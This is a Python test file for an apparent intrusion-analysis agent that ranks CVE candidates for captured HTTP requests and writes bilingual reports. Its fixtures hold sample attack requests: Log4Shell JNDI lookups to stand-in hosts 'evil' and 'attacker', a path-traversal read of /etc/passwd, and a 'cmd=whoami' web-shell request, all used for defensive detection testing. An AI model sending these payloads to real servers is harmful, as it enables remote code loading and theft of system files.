from __future__ import annotations

import sys
from pathlib import Path
import json

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.agent.agent import TraceAgent
from src.report.generator import write_report


def test_trace_agent_preserves_cve_evidence_and_support_level() -> None:
    analysis = TraceAgent().analyze(
        payloads=["GET /?x=${jndi:ldap://evil/a} HTTP/1.1"],
        candidates=[
            {
                "event_id": "pkt-1",
                "rank": 1,
                "cve": "CVE-2021-44228",
                "final_score": 0.92,
                "retrieval_score": 0.17,
                "rule_bonus": 0.75,
                "rule_confirmed": True,
                "signals": ["log4shell_jndi"],
                "neighbor_id": "datacon-row-1",
                "neighbor_payload": "GET /?x=${jndi:ldap://attacker/a} HTTP/1.1",
                "neighbor_labels": ["CVE-2021-44228"],
                "label_votes": {"CVE-2021-44228": 3},
                "evidence": "GET /?x=${jndi:ldap://attacker/a} HTTP/1.1",
            }
        ],
    )
    top = analysis["top_cves"][0]
    assert top["cve"] == "CVE-2021-44228"
    assert top["event_ids"] == ["pkt-1"]
    assert top["label_votes"]["CVE-2021-44228"] == 3
    assert top["evidence_details"][0]["neighbor_id"] == "datacon-row-1"
    assert "jndi" in top["evidence_details"][0]["neighbor_payload"]
    assert top["cve_support_level"] == "rule_confirmed"


def test_trace_agent_assigns_cve_support_levels() -> None:
    analysis = TraceAgent().analyze(
        payloads=["GET /mixed HTTP/1.1"],
        candidates=[
            {
                "event_id": "pkt-1",
                "cve": "CVE-2021-44228",
                "final_score": 0.92,
                "rule_confirmed": True,
            },
            {
                "event_id": "pkt-2",
                "cve": "CVE-2022-22965",
                "final_score": 0.42,
                "signals": ["spring4shell_param"],
            },
            {
                "event_id": "pkt-3",
                "cve": "CVE-2021-41773",
                "final_score": 0.61,
            },
            {
                "event_id": "pkt-4",
                "cve": "CVE-2020-0001",
                "final_score": 0.11,
            },
        ],
    )
    levels = {item["cve"]: item["cve_support_level"] for item in analysis["top_cves"]}
    assert levels == {
        "CVE-2021-44228": "rule_confirmed",
        "CVE-2022-22965": "rule_supported",
        "CVE-2021-41773": "retrieval_only",
        "CVE-2020-0001": "weak_candidate",
    }


def test_report_preserves_cve_support_level_in_json_and_markdown(tmp_path) -> None:
    analysis = TraceAgent().analyze(
        payloads=["GET /?x=${jndi:ldap://evil/a} HTTP/1.1"],
        candidates=[
            {
                "event_id": "pkt-1",
                "cve": "CVE-2021-44228",
                "final_score": 0.92,
                "retrieval_score": 0.17,
                "rule_confirmed": True,
                "signals": ["log4shell_jndi"],
                "evidence": "GET /?x=${jndi:ldap://attacker/a} HTTP/1.1",
            },
            {
                "event_id": "pkt-2",
                "cve": "CVE-2021-41773",
                "final_score": 0.61,
                "retrieval_score": 0.61,
                "evidence": "GET /cgi-bin/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1",
            },
        ],
    )
    md_path = write_report(analysis, output_dir=tmp_path)
    json_path = md_path.with_suffix(".json")

    report_json = json.loads(json_path.read_text(encoding="utf-8"))
    assert all("cve_support_level" in item for item in report_json["top_cves"])
    assert {item["cve"]: item["cve_support_level"] for item in report_json["top_cves"]} == {
        "CVE-2021-44228": "rule_confirmed",
        "CVE-2021-41773": "retrieval_only",
    }
    report_text = md_path.read_text(encoding="utf-8")
    assert "| CVE | Support Level |" in report_text
    assert "| CVE-2021-44228 | rule_confirmed |" in report_text
    assert "| CVE-2021-41773 | retrieval_only |" in report_text


def test_report_contains_four_part_evidence_structure_in_both_languages(tmp_path) -> None:
    analysis = TraceAgent().analyze(
        payloads=["GET /shell?cmd=whoami HTTP/1.1"],
        candidates=[],
    )
    analysis["impact_assessment"] = {
        "verdict": "Possible exploitation attempt",
        "confidence": "low",
        "reasoning": "Command execution parameters were observed, but all related HTTP responses were 4xx.",
        "evidence_ids": ["pkt-4"],
        "related_cves": [],
        "http_status_codes": [404],
        "missing_evidence": [
            "Only 4xx HTTP responses were observed for exploit-like requests; exploitation success is less likely from network evidence alone."
        ],
    }
    md_path = write_report(analysis, output_dir=tmp_path)
    zh_path = md_path.with_name(md_path.stem + "_zh.md")

    for report_text in [
        md_path.read_text(encoding="utf-8"),
        zh_path.read_text(encoding="utf-8"),
    ]:
        assert "### Evidence Observed" in report_text
        assert "### Not Observed" in report_text
        assert "### Confidence Drivers" in report_text
        assert "### Reducers" in report_text
        assert "4xx" in report_text


if __name__ == "__main__":
    test_trace_agent_preserves_cve_evidence_and_support_level()
    test_trace_agent_assigns_cve_support_levels()
